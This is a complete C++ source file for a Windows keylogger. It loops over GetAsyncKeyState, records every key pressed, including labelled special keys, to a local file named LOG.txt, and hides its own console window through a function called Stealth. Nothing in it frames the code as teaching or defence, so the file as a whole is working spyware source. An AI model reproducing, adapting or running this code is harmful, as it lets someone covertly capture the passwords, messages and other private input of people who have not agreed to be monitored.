#include <iostream> 
#include <windows.h> 
#include <winuser.h>

using namespace std;

int Save (int key_stroke, char *file);
void Stealth();

int main() {
    Stealth();
    char i;

    while (1) {
        for(i = 8; i <= 190; i++) {
            if (GetAsyncKeyState(i) == -32767)
                Save(i, "LOG.txt");
        }
    }
    system("PAUSE");
    return 0;
}

/* * ********************************** */

int Save (int key_stroke, char *file) {
    if ((key_stroke == 1) || (key_stroke == 2))
        return 0;

    FILE * OUTPUT_FILE;
    OUTPUT_FILE = fopen(file, "a+");

    cout << key_stroke << endl;

    if (key_stroke == 8)
        fprintf(OUTPUT_FILE, "%s", "\n[BACKSPACE]");
    else if (key_stroke == 13)
        fprintf(OUTPUT_FILE, "%s", "\n");
    else if (key_stroke == 32)
        fprintf(OUTPUT_FILE, "%s", " ");
    else if (key_stroke == VK_TAB)
        fprintf(OUTPUT_FILE, "%s", "\n[TAB]");
    else if (key_stroke == VK_SHIFT)
        fprintf(OUTPUT_FILE, "%s", "\n[SHIFT]");
    else if (key_stroke == VK_CONTROL)
        fprintf(OUTPUT_FILE, "%s", "\n[CONTROL]");
    else if (key_stroke == VK_ESCAPE)
        fprintf(OUTPUT_FILE, "%s", "\n[ESCAPE]");
    else if (key_stroke == VK_END)
        fprintf(OUTPUT_FILE, "%s", "\n[END]");
    else if (key_stroke == VK_HOME)
        fprintf(OUTPUT_FILE, "%s", "\n[HOME]");
    else if (key_stroke == VK_LEFT)
        fprintf(OUTPUT_FILE, "%s", "\n[LEFT]");
    else if (key_stroke == VK_UP)
        fprintf(OUTPUT_FILE, "%s", "\n[UP]");
    else if (key_stroke == VK_RIGHT)
        fprintf(OUTPUT_FILE, "%s", "\n[RIGHT]");
    else if (key_stroke == VK_DOWN)
        fprintf(OUTPUT_FILE, "%s", "\n[DOWN]");
    else if (key_stroke == 190 || key_stroke == 110)
        fprintf(OUTPUT_FILE, "%s", ".");
    else if (key_stroke == VK_HOME)
        fprintf(OUTPUT_FILE, "%s", "\n[HOME]");
    else if (key_stroke == VK_LWIN)
        fprintf(OUTPUT_FILE, "%s", "\n[LEFT_WIN]");
    else if (key_stroke == VK_RWIN)
        fprintf(OUTPUT_FILE, "%s", "\n[RIGHT_WIN]");
    else if (key_stroke == VK_NUMLOCK)
        fprintf(OUTPUT_FILE, "%s", "\n[NUM_LOCK]");
    else if (key_stroke == VK_MENU)
        fprintf(OUTPUT_FILE, "%s", "\n[ALT]");
    else if (key_stroke == VK_F1)
        fprintf(OUTPUT_FILE, "%s", "\n[F1]");
    else if (key_stroke == VK_F2)
        fprintf(OUTPUT_FILE, "%s", "\n[F2]");
    else if (key_stroke == VK_F3)
        fprintf(OUTPUT_FILE, "%s", "\n[F3]");
    else if (key_stroke == VK_F4)
        fprintf(OUTPUT_FILE, "%s", "\n[F4]");
    else if (key_stroke == VK_F5)
        fprintf(OUTPUT_FILE, "%s", "\n[F5]");
    else if (key_stroke == VK_F6)
        fprintf(OUTPUT_FILE, "%s", "\n[F6]");
    else if (key_stroke == VK_F7)
        fprintf(OUTPUT_FILE, "%s", "\n[F7]");
    else if (key_stroke == VK_F8)
        fprintf(OUTPUT_FILE, "%s", "\n[F8]");
    else if (key_stroke == VK_F9)
        fprintf(OUTPUT_FILE, "%s", "\n[F9]");
    else if (key_stroke == VK_F10)
        fprintf(OUTPUT_FILE, "%s", "\n[F10]");
    else if (key_stroke == VK_F11)
        fprintf(OUTPUT_FILE, "%s", "\n[F11]");
    else if (key_stroke == VK_F12)
        fprintf(OUTPUT_FILE, "%s", "\n[F12]");

    else
        fprintf (OUTPUT_FILE, "%s", &key_stroke);

    fclose(OUTPUT_FILE);
    return 0;
}

/* * ********************************** */

void Stealth() {
    HWND Stealth;
    AllocConsole();
    Stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(Stealth, 0);
}

